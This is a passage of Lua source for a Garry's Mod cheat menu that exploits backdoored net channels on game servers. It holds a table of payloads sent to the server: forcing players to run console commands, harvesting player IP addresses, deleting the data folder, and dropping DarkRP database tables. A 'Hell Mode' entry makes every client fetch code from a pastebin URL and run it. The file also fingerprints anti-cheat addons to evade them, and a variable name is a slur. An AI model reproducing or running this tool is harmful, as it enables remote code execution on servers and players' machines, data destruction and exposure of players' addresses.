    ["Code"] = [[ if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end ]],
    ["Desc"] = "",
  },
  ["Freeze/Unfreeze player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Freeze( !v:IsFrozen() ) ]],
    ["Desc"] = "",
  },
  ["Force say"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Say(@1) ]],
    ["Desc"] = "forces the play to say anything in chat",
    ["NeedsParameters"] = 1,
  },
  ["Force concommand"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:ConCommand(@1) ]],
    ["Desc"] = "forces the player to type anything into console",
    ["NeedsParameters"] = 1,
  },
  ["Grab IP"] = {
    ["Type"] = 2,
    ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end ]],
    ["Desc"] = "Grabs the players IP address and prints it for you",
  },
  ["DarkRP add/remove money"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:addMoney(@1) ]],
    ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",
    ["NeedsParameters"] = 1,
  },
  ["DarkRP force job"] = {
    ["Type"] = 2,
    ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end ]],
    ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",
    ["NeedsParameters"] = 1,
  },
  ["Noclip player"] = {
    ["Type"] = 2,
    ["Code"] = [[ if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],
    ["Desc"] = "Toggles noclip on the specified players",
    ["NeedsParameters"] = 1,
  },
  ["Give weapon to player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Give( @1 ) ]],
    ["Desc"] = "Gives this player a weapon (first parameter)",
    ["NeedsParameters"] = 1,
  },
  ["Teleport (to your cursor)"] = {
    ["Type"] = 2,
    ["Code"] = [[ local tp = false local tpos for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end if tp then v:SetPos( tpos ) end ]],
    ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once",
  },
  ["Teleport (you to them)"] = {
    ["Type"] = 2,
    ["Code"] = [[ local tp = false local tpos = v:GetPos() + Vector( 32, 0, 10) for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end ]],
    ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall",
  },
  ["Kick player"] = {
    ["Type"] = 2,
    ["Code"] = [[ v:Kick( @1 ) ]],
    ["Desc"] = "First parameter = reason for kick",
  },
  ["M9K nuke"] = {
    ["Type"] = 2,
    ["Code"] = [[ if (m9k) then local nuke = ents.Create("m9k_davy_crockett_explo") nuke:SetPos(v:GetPos()) nuke:SetOwner(v) nuke.Owner = v nuke:Spawn() nuke:Activate() end ]],
    ["Desc"] = "Causes selected player to get blamed for killing everyone",
  },


  ["Cleanup map"] = {
    ["Type"] = 3,
    ["Code"] = [[ game.CleanUpMap() ]],
    ["Desc"] = "",
  },

  ["DarkRP clear all money"] = {
    ["Type"] = 3,
    ["Code"] = [[ RunConsoleCommand("rp_resetallmoney") ]],
    ["Desc"] = "",
  },
  ["Hell Mode"] = {
    ["Type"] = 3,
    ["Code"] = [[ BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1', function(b) RunString(b) end )") ]],
    ["Desc"] = "This will make everyone experience what hell is like",
  },
  ["Vaporize all players"] = {
    ["Type"] = 3,
    ["Code"] = [[ for k, v in pairs(player.GetAll()) do v:Remove() end ]],
    ["Desc"] = "Removes the player entity turning them into errors",
  },
  ["FPP Unrestrict everything"] = {
    ["Type"] = 3,
    ["Code"] = [[ FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],
    ["Desc"] = "",
  },
  ["Wipe data folder"] = {
    ["Type"] = 3,
    ["Code"] = [[ local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],
    ["Desc"] = "Removes everything contained the garrysmod/data",
  },
  ["Wipe DarkRP SQL Tables"] = {
    ["Type"] = 3,
    ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],
    ["Desc"] = "This will break darkrp forcing them to reinstall darkrp",
  },
}

local selectedbackdoor = ""
local backdoorargs = ""
local selectedplayers = {}

local function CheckBackdoors()
channel = ""
for k,v in pairs(nets) do
    if( qrexton.StringExists(v) ) then
        channel = v
        vulChannel[v] = {name = v}
    end
  end
  if(channel == "") then
    qrexchat("No channel has been found.")
  else
    for _, q in pairs(vulChannel) do
      qrexchat("Found vulnerability ▶ " .. q.name)
    end
    qrexchat("Total backdoors: " .. table.Count(vulChannel))
  end
end

function qrexton.BackdoorList(parent, category)
  for k, v in SortedPairs(backdoors, false) do
    if v["Type"] ~= category then continue end
      local plypanel2 = vgui.Create("DPanel")
      plypanel2:SetPos(0, 0)
      plypanel2:SetSize(200, 25)

      plypanel2.Paint = function()
        draw.RoundedBoxEx(8, 1, 1, plypanel2:GetWide(), plypanel2:GetTall(), Color(30, 30, 30, 150), false, false, false, false)
        if selectedbackdoor == k then
          surface.SetDrawColor(Color(87, 39, 210, 255))
        else
          surface.SetDrawColor(Color(50, 50, 50, 255))
        end
          surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1, plypanel2:GetTall() - 1)
        end

        local plyname = vgui.Create("DLabel", plypanel2)
        plyname:SetPos(10, 5)
        plyname:SetFont("DermaDefault")
        local tcol = Color(255, 255, 255)

        if v["Private"] then
          tcol = Color(155, 255, 155)
        end

        plyname:SetColor(tcol)
        plyname:SetText(k)
        plyname:SetSize(180, 15)
        local fag = vgui.Create("DButton", plypanel2)
        fag:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
        fag:SetPos(0, 0)
        fag:SetText("")

        if v["Desc"] ~= "" then
          fag:SetToolTip(v["Desc"])
        end

        fag.Paint = function(panel, w, h) return end

        fag.DoClick = function()
          selectedbackdoor = k
        end
        parent:AddItem(plypanel2)
    end
end

function qrexton.FormatCodeTargeted()
    if selectedbackdoor == "" then
      qrexchat("You haven't selected a macro to use!")
      return
    end

    local param = string.Explode(",", backdoorargs)
    local ids = {}

    for k, v in pairs(selectedplayers) do
      if not v:IsValid() then
        table.RemoveByValue(selectedplayers, v)
          continue
      end
      table.insert(ids, v:UniqueID())
    end

    local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]
    code = string.Replace(code, "##", table.ToString(ids))
    code = string.Replace(code, "%%", backdoors[selectedbackdoor]["Code"] or "")
    code = string.Replace(code, "%LP", "p:UniqueID() == \"" .. LocalPlayer():UniqueID() .. "\"")

    if backdoors[selectedbackdoor]["NeedsParameters"] and (backdoors[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "") then
      qrexchat("This macro requires parameters to work!")
      return
    end

    if #param < 1 then
      param = {
        [1] = "derp",
        [2] = "derp",
        [3] = "derp",
        [4] = "derp",
        [5] = "derp"
        }
    end

  for k, v in pairs(param) do
    code = string.Replace(code, "@" .. k, [["]] .. v .. [["]])
  end
  qrexton.Fire(code)
end

function qrexton.FormatCodeGlobal()

  if selectedbackdoor == "" then
    qrexchat("You haven't selected a macro to use!")
    return
  end

  local param = string.Explode(",", backdoorargs)
  local code = backdoors[selectedbackdoor]["Code"]

  if backdoors[selectedbackdoor]["NeedsParameters"] and (backdoors[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "") then
    qrexchat("This macro requires parameters to work!")
    return
  end

  if #param < 1 then
    param = {
      [1] = "derp",
      [2] = "derp",
      [3] = "derp",
      [4] = "derp",
      [5] = "derp"
    }
  end

  for k, v in pairs(param) do
    code = string.Replace(code, "@" .. k, [["]] .. v .. [["]])
    code = string.Replace(code, "%LP", LocalPlayer():UniqueID())
    code = string.Replace(code, "%LCP", "p:UniqueID() == \"" .. LocalPlayer():UniqueID() .. "\"")
  end
    qrexton.Fire(code)
end

function qrexton.Fire(code)
  if (channel == "") then
    qrexchat("Please select a netstring")
    return
  end
  net.Start(channel)
  net.WriteString(code)
  net.WriteBit(1)
  net.SendToServer()
end

local Plist = vgui.Create("DPanelList", qrexTable[5])
Plist:SetPos(133, 51)
Plist:SetSize(185, 522)
Plist:SetPadding(4)
Plist:SetSpacing(5)
Plist:EnableHorizontal(false)
Plist:EnableVerticalScrollbar(true)
Plist:SetName("")
Plist:CleanList()

Plist.Paint = function(self, w, h)
  return
end

local Plist2 = vgui.Create("DPanelList", qrexTable[5])
Plist2:SetPos(323, 51)
Plist2:SetSize(184, 603)
Plist2:SetPadding(4)
Plist2:SetSpacing(5)
Plist2:EnableHorizontal(false)
Plist2:EnableVerticalScrollbar(true)
Plist2:SetName("")

Plist2.Paint = function(self, w, h)
  return
end

local Plist3 = vgui.Create("DPanelList", qrexTable[5])
Plist3:SetPos(513, 51)
Plist3:SetSize(174, 213)
Plist3:SetPadding(4)
Plist3:SetSpacing(5)
Plist3:EnableHorizontal(false)
Plist3:EnableVerticalScrollbar(true)
Plist3:SetName("")

Plist3.Paint = function(self, w, h)
  return
end

local Plist4 = vgui.Create("DPanelList", qrexTable[5])
Plist4:SetPos(513, 323)
Plist4:SetSize(174, 232)
Plist4:SetPadding(4)
Plist4:SetSpacing(5)
Plist4:EnableHorizontal(false)
Plist4:EnableVerticalScrollbar(true)
Plist4:SetName("")

Plist4.Paint = function(self, w, h)
  return
end

local scan = vgui.Create("DButton", qrexTable[5])
scan:SetPos(130, 585)
scan:SetSize(180, 35)
scan:SetText("")
scan.Paint = function(self, w, h)
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
    draw.SimpleTextOutlined("Scan Backdoors", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

scan.DoClick = function()
  surface.PlaySound("buttons/button18.wav")
  CheckBackdoors()
end

local macro = vgui.Create("DTextEntry", qrexTable[5])
macro:SetPos(513, 585)
macro:SetSize(174, 30)
macro:SetText( backdoorargs )
macro:SetFont("DermaDefault")
macro.Paint = function(self, w, h)
  draw.RoundedBox(2, 0, 0, 920, 700, Color(17, 17, 17))
  draw.RoundedBox(2, 0, 0, self:GetWide(), 25, Color(0, 0, 0, 200))
  draw.RoundedBox(2, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
  surface.SetDrawColor(20, 20, 20)
	self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
end

macro.OnChange = function( self )
  backdoorargs = self:GetValue()
end

local target = vgui.Create("DButton", qrexTable[5])
target:SetPos(130, 626)
target:SetSize(180, 35)
target:SetText("")
target.Paint = function(self, w, h)
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
    draw.SimpleTextOutlined("Target Backdoor", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

target.DoClick = function()
  surface.PlaySound("buttons/button18.wav")
  qrexchat("NetString ▶ " .. macro:GetValue())
  channel = macro:GetValue()
end

local fag = vgui.Create("DButton", qrexTable[5])
fag:SetPos(510, 626)
fag:SetSize(180, 35)
fag:SetText("")
fag.Paint = function(self, w, h)
    surface.SetDrawColor(0, 0, 0)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(50, 50, 50)
    surface.DrawRect(1, 1, w - 2, h - 2)
    surface.SetMaterial(Material("gui/gradient_up"))
    surface.SetDrawColor(35, 35, 35)
    surface.DrawTexturedRect(2, 2, w - 4, h - 4)
    draw.SimpleTextOutlined("Activate Backdoor", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

fag.DoClick = function()
  surface.PlaySound("buttons/button18.wav")
  if !backdoors[selectedbackdoor] or selectedbackdoor == "" then qrexchat( "You haven't selected a feature" ) return end
  if backdoors[selectedbackdoor].Type == ( 1 or 3 ) then qrexton.FormatCodeGlobal() else qrexton.FormatCodeTargeted() end
end

local t1 = vgui.Create("DButton", qrexTable[5])
t1:SetSize( 40, 20 )
t1:SetPos( 578, 278 )
t1:SetText("")
t1:SetTextColor(Color(255, 255, 255, 255))
t1.Paint = function(self, w, h)
  surface.SetDrawColor(0, 0, 0)
  surface.DrawRect(0, 0, w, h)
  surface.SetDrawColor(50, 50, 50)
  surface.DrawRect(1, 1, w - 2, h - 2)
  surface.SetMaterial(Material("gui/gradient_up"))
  surface.SetDrawColor(35, 35, 35)
  surface.DrawTexturedRect(2, 2, w - 4, h - 4)
  draw.SimpleTextOutlined("All", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

t1.DoClick = function()
  for _, p in pairs(player.GetAll()) do
    if not table.HasValue( selectedplayers, p ) then
      table.insert( selectedplayers, p )
    end
  end
end

local t2 = vgui.Create("DButton", qrexTable[5])
t2:SetSize( 40, 20 )
t2:SetPos( 624, 278 )
t2:SetText("")
t2:SetTextColor(Color(255, 255, 255, 255))
t2.Paint = function(self, w, h)
  surface.SetDrawColor(0, 0, 0)
  surface.DrawRect(0, 0, w, h)
  surface.SetDrawColor(50, 50, 50)
  surface.DrawRect(1, 1, w - 2, h - 2)
  surface.SetMaterial(Material("gui/gradient_up"))
  surface.SetDrawColor(35, 35, 35)
  surface.DrawTexturedRect(2, 2, w - 4, h - 4)
  draw.SimpleTextOutlined("None", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

t2.DoClick = function()
  table.Empty( selectedplayers )
end

local t3 = vgui.Create("DButton", qrexTable[5])
t3:SetSize( 20, 20 )
t3:SetPos( 670, 278 )
t3:SetText("")
t3:SetTextColor(Color(255, 255, 255, 255))
t3.Paint = function(self, w, h)
  surface.SetDrawColor(0, 0, 0)
  surface.DrawRect(0, 0, w, h)
  surface.SetDrawColor(50, 50, 50)
  surface.DrawRect(1, 1, w - 2, h - 2)
  surface.SetMaterial(Material("gui/gradient_up"))
  surface.SetDrawColor(35, 35, 35)
  surface.DrawTexturedRect(2, 2, w - 4, h - 4)
  draw.SimpleTextOutlined("Me", "DermaDefault", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1, 1, color_black)
end

t3.DoClick = function()
  table.Empty( selectedplayers )
  table.insert( selectedplayers, LocalPlayer() )
end

for k, v in pairs( player.GetAll() ) do
  local plypanel2 = vgui.Create( "DPanel", qrexTable[5] )
  plypanel2:SetPos( 513, 313 )
  plypanel2:SetSize( 200, 25 )
  plypanel2.Paint = function()
    draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(30, 30, 30), false, false, false, false)
    if table.HasValue( selectedplayers, v ) then surface.SetDrawColor(Color(87, 39, 210, 255)) else surface.SetDrawColor(Color(50, 50, 50, 255)) end
    surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

  end

  local plyname = vgui.Create( "DLabel", plypanel2 )
  plyname:SetPos( 10, 5 )
  plyname:SetFont( "DermaDefault" )

  local tcol = Color( 0, 184, 255 )

  if v == LocalPlayer() then tcol = Color( 87, 50, 210 ) end
  plyname:SetColor( tcol )
  plyname:SetText( v:Nick() )
  plyname:SetSize(180, 15)

  local fag = vgui.Create("DButton", plypanel2)
  fag:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
  fag:SetPos( 0, 0 )
  fag:SetText("")
  fag.Paint = function(panel, w, h)
      return
  end

  fag.DoClick = function()
    if table.HasValue( selectedplayers, v ) then
      table.RemoveByValue( selectedplayers, v )
    else
      table.insert( selectedplayers, v )
    end
  end

  Plist4:AddItem( plypanel2 )
end

qrexton.BackdoorList( Plist, 1 )
qrexton.BackdoorList( Plist2, 2 )
qrexton.BackdoorList( Plist3, 3 )

qrexTable[6].Paint = function(self, w, h)
    draw.Essential(48 + (100 * 6 - 100), self)
    qrexton.DrawMaterial(qrexton.Materials.F, 20, 560, 80, 80, Color(87,39,210))

    qrexton.labelOutline("Miscellaneous", {130, 39}, {270, 400})
    qrexton.labelOutline([[Detections( ]]..totalAddons..[[ / 6 )]], {130, 456}, {270, 205})
    qrexton.labelOutline("Settings", {425, 39}, {270, 150})
    qrexton.labelOutline("Configurations", {425, 211}, {270, 450})
end

local addons = {
  ["SNTE"] = {
    desc = "Bans players for attempting to use \n net backdoors on servers, easy to get around",
    scan = function() if ConVarExists("snte_duperun") or file.Exists("epstat.lua", "LUA") then
      return true
    end
      return false
    end
  },

  ["BetterSNTE"] = {
    desc = "This is an extension of snte which \n bans players for attempting to look for nets",
    scan = function() if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
      return true
    end
      return false
    end
  },

  ["Modern AC"] = {
    desc = "A complete waste of an addon not \n used much on any servers as its useless",
    scan = function() if file.Exists("autorun/client/cl_mac.lua", "LUA") then
      return true
    end
      return false
    end
  },

  ["Swift AC"] = {
    desc = "Gmodstore scam anticheat does \n nothing doesn't even detect smeghack",
    scan = function() if file.Exists("swiftac.lua", "LUA") then
      return true
    end
      return false
    end
  },

  ["Glorified AC"] = {
    desc = "Probably the best anticheat in 2020 \n His killed cheaters since 2018",
    scan = function() if file.Exists("autorun/glorifiedanticheat.lua", "LUA") then
      return true
    end
      return false
    end
  },

  ["Screengrab"] = {
    desc = "A method used on servers to take pictures\n of a player screen to seen cheats",
    scan = function() if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") or qrexton.StringExists("qrex")  then
      return true
    end
      return false
    end
  },
}

local abb = vgui.Create("DPanelList", qrexTable[6])
abb:SetPos(140, 472)
abb:SetSize(250, 177)
abb:SetPadding(5)
abb:SetSpacing(5)
abb:EnableHorizontal(false)
abb:EnableVerticalScrollbar(true)
abb:SetName("")

local function ACPanel(cmd)
  local cmdp = vgui.Create("DPanel")
  cmdp:SetSize(abb:GetWide(), 60)
  cmdp.Cmd = cmd
  cmdp.Desc = addons[cmd].desc

  cmdp.Paint = function(self, w, h)
    draw.OutlinedBox(4.8, 4.8, w - 8, h - 8, 1, Color(50, 50, 50))
    draw.WordBox(5, 15, -8, cmdp.Cmd, "DermaDefault", Color(30, 30, 30), Color(255, 255, 255))
    draw.DrawText(cmdp.Desc, "DermaDefault", 12, 20, Color(80, 39, 220, 255))
  end
  abb:AddItem(cmdp)
end

for k, v in pairs(addons) do
  if v.scan() then
    ACPanel(k)
    totalAddons = totalAddons + 1
  end
end

function qrexton.emptyButton(parent, pos, size, func)
    local emptyButton = parent:Add("DButton")
    emptyButton:SetText("")
    emptyButton:SetPos(pos[1], pos[2])
    emptyButton:SetSize(size[1], size[2])
    emptyButton.DoClick = func

    emptyButton.Paint = function(self, w, h)
        surface.SetDrawColor(255, 255, 255)
    end
end

function qrexton.createTabButtons(amount)
  for i = 1, amount do
    qrexton.emptyButton(qrex, {8, 48 + (100 * i - 100)}, {101, 106}, function()
      qrexTable[i]:SetVisible(true)
      for k, v in pairs(qrexTable) do
        if (k ~= i) then
          qrexTable[k]:SetVisible(false)
        end
      end
    end)
  end
end

qrexton.createTabButtons(6)

qrex:Hide()
local toggle = false

hook.Add("Think", "keyToggle", function()
  if input.IsKeyDown(openKey) and not toggle then
    toggle = true
    qrex:SetVisible(not qrex:IsVisible())
    gui.EnableScreenClicker(qrex:IsVisible())
  elseif not input.IsKeyDown(openKey) then
    toggle = false
  end
end)
